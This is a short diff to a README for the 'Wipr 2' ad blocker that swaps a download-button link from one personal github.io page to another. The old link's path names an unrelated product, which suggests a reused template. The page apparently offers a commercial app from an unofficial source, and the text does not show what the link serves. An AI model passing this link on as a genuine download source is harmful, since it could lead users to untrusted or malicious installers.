@@ -55,7 +55,7 @@ With **Wipr 2**, enjoy a completely ad-free, secure, and faster internet experie
 ## Download Wipr 2
 
 <div align="center">
-  <a href="https://junimata-orex.github.io/.github/navicat">
+  <a href="https://wipr-2.github.io/.github">
     <img src="https://img.shields.io/badge/⬇️_Download_Wipr_2-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Wipr 2">
   </a>
 </div>
